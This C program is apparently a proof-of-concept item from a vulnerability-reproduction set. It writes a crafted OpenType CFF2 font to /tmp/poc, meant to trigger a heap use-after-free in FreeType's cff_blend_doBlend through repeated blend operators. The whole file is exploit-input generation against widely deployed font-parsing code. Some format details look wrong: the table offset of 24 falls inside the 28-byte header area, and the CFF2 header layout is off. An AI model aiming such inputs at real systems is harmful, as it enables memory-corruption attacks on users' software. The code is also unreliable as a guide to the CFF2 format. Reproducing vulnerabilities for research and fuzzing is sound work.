#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:368 */
/* Triggers: heap-use-after-free in cff_blend_doBlend (FreeType CFF2) */
/* Vuln class: use_after_free */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType wrapper with OTTO magic */
    fputc('O', f);
    fputc('T', f);
    fputc('T', f);
    fputc('O', f);
    /* numTables = 1, searchRange, entrySelector, rangeShift */
    fputc(0x00, f); fputc(0x01, f); /* numTables = 1 */
    fputc(0x00, f); fputc(0x10, f); /* searchRange */
    fputc(0x00, f); fputc(0x00, f); /* entrySelector */
    fputc(0x00, f); fputc(0x10, f); /* rangeShift */

    /* Table record for 'CFF2' */
    fputc('C', f); fputc('F', f); fputc('F', f); fputc('2', f); /* tag */
    /* checksum (0) */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    /* offset (24 = start of CFF2 data) */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x18, f);
    /* length (will be updated later) */
    long length_pos = ftell(f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* CFF2 data start */
    long cff2_start = ftell(f);

    /* Header: major=2, minor=0, hdrSize=5, offSize=4, padding=0 */
    fputc(0x02, f);
    fputc(0x00, f);
    fputc(0x05, f);
    fputc(0x04, f);
    fputc(0x00, f);

    /* Top DICT length placeholder (will be updated) */
    long top_dict_len_pos = ftell(f);
    fputc(0x00, f); fputc(0x00, f);

    /* Top DICT data will be written later with correct offsets */
    long top_dict_start = ftell(f);
    /* Reserve space for Top DICT: 5+6+6+5+1 = 23 bytes */
    int i;
    for (i = 0; i < 23; i++) {
        fputc(0x00, f);
    }
    long top_dict_end = ftell(f);

    /* Update topDictLength */
    unsigned int top_dict_len = (unsigned int)(top_dict_end - top_dict_start);
    fseek(f, top_dict_len_pos, SEEK_SET);
    fputc((top_dict_len >> 8) & 0xFF, f);
    fputc(top_dict_len & 0xFF, f);
    fseek(f, top_dict_end, SEEK_SET);

    /* Global Subr INDEX (empty) - CFF2 uses 32-bit count */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* CharStrings INDEX (non-empty, count=1):
       Glyph data (15 bytes):
       vsindex 0 (0x0F 0x00)
       First blend: v1=0, w1=0, count=2, blend (0x1D)
       Second blend: v1=0, w1=0, count=2, blend (0x1D)
       endchar (0x0E)
    */
    long charstrings_start = ftell(f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f); /* count=1 */
    fputc(0x01, f); /* offSize=1 */
    fputc(0x01, f); /* offset[0]=1 */
    fputc(0x10, f); /* offset[1]=16 */
    fputc(0x0F, f); /* vsindex operator */
    fputc(0x00, f); /* vsindex = 0 */
    fputc(0x00, f); /* v1 */
    fputc(0x00, f); /* w1 */
    fputc(0x02, f); /* count = 2 */
    fputc(0x1D, f); /* first blend operator */
    fputc(0x00, f); /* v1 */
    fputc(0x00, f); /* w1 */
    fputc(0x02, f); /* count = 2 */
    fputc(0x1D, f); /* second blend operator */
    fputc(0x0E, f); /* endchar */
    long charstrings_end = ftell(f);

    /* FDSelect: format 0, nGlyphs=1 (2 bytes), map[0]=0 */
    long fdselect_start = ftell(f);
    fputc(0x00, f); /* format=0 */
    fputc(0x00, f); fputc(0x01, f); /* nGlyphs = 1 (big-endian) */
    fputc(0x00, f); /* glyph 0 -> FD 0 */
    long fdselect_end = ftell(f);

    /* FDArray INDEX (non-empty, count=1):
       Font DICT with Private operator (size=0, offset=0)
       Font DICT data: 0x12 0x00 0x00 (Private size=0, offset=0) then 0x0E (end)
    */
    long fdarray_start = ftell(f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f); /* count=1 */
    fputc(0x01, f); /* offSize=1 */
    fputc(0x01, f); /* offset[0]=1 */
    fputc(0x05, f); /* offset[1]=5 */
    fputc(0x12, f); /* Private operator */
    fputc(0x00, f); /* private_size = 0 */
    fputc(0x00, f); /* private_offset = 0 */
    fputc(0x0E, f); /* end */
    long fdarray_end = ftell(f);

    /* VariationStore (vstore):
       Format 0, offsetSize=1, regionCount=1, subRegions INDEX with 1 entry
    */
    long vstore_start = ftell(f);
    fputc(0x00, f); /* format=0 */
    fputc(0x01, f); /* offsetSize=1 */
    fputc(0x00, f); fputc(0x01, f); /* regionCount=1 */
    /* subRegions INDEX (CFF2): 32-bit count=1, offSize=1, offsets[2]=1,2, data=1 byte */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f); /* count=1 */
    fputc(0x01, f); /* offSize=1 */
    fputc(0x01, f); /* offset[0]=1 */
    fputc(0x02, f); /* offset[1]=2 */
    fputc(0x00, f); /* data byte */
    long vstore_end = ftell(f);

    /* Now go back and write the Top DICT with correct offsets */
    fseek(f, top_dict_start, SEEK_SET);

    /* CharStrings offset (op 17 = 0x11) */
    unsigned int cs_offset = (unsigned int)(charstrings_start - cff2_start);
    fputc(0x11, f);
    fputc((cs_offset >> 24) & 0xFF, f);
    fputc((cs_offset >> 16) & 0xFF, f);
    fputc((cs_offset >> 8) & 0xFF, f);
    fputc(cs_offset & 0xFF, f);

    /* FDSelect offset (op 12 37 = 0x0C 0x25) */
    unsigned int fds_offset = (unsigned int)(fdselect_start - cff2_start);
    fputc(0x0C, f); fputc(0x25, f);
    fputc((fds_offset >> 24) & 0xFF, f);
    fputc((fds_offset >> 16) & 0xFF, f);
    fputc((fds_offset >> 8) & 0xFF, f);
    fputc(fds_offset & 0xFF, f);

    /* FDArray offset (op 12 36 = 0x0C 0x24) */
    unsigned int fda_offset = (unsigned int)(fdarray_start - cff2_start);
    fputc(0x0C, f); fputc(0x24, f);
    fputc((fda_offset >> 24) & 0xFF, f);
    fputc((fda_offset >> 16) & 0xFF, f);
    fputc((fda_offset >> 8) & 0xFF, f);
    fputc(fda_offset & 0xFF, f);

    /* VariationStore offset (op 24 = 0x18) */
    unsigned int vs_offset = (unsigned int)(vstore_start - cff2_start);
    fputc(0x18, f);
    fputc((vs_offset >> 24) & 0xFF, f);
    fputc((vs_offset >> 16) & 0xFF, f);
    fputc((vs_offset >> 8) & 0xFF, f);
    fputc(vs_offset & 0xFF, f);

    /* end (14 = 0x0E) */
    fputc(0x0E, f);

    /* Seek to end */
    fseek(f, vstore_end, SEEK_SET);

    /* Update table length */
    long end_pos = ftell(f);
    fseek(f, length_pos, SEEK_SET);
    unsigned int table_length = (unsigned int)(end_pos - 24);
    fputc((table_length >> 24) & 0xFF, f);
    fputc((table_length >> 16) & 0xFF, f);
    fputc((table_length >> 8) & 0xFF, f);
    fputc(table_length & 0xFF, f);

    fclose(f);
    return 0;
}

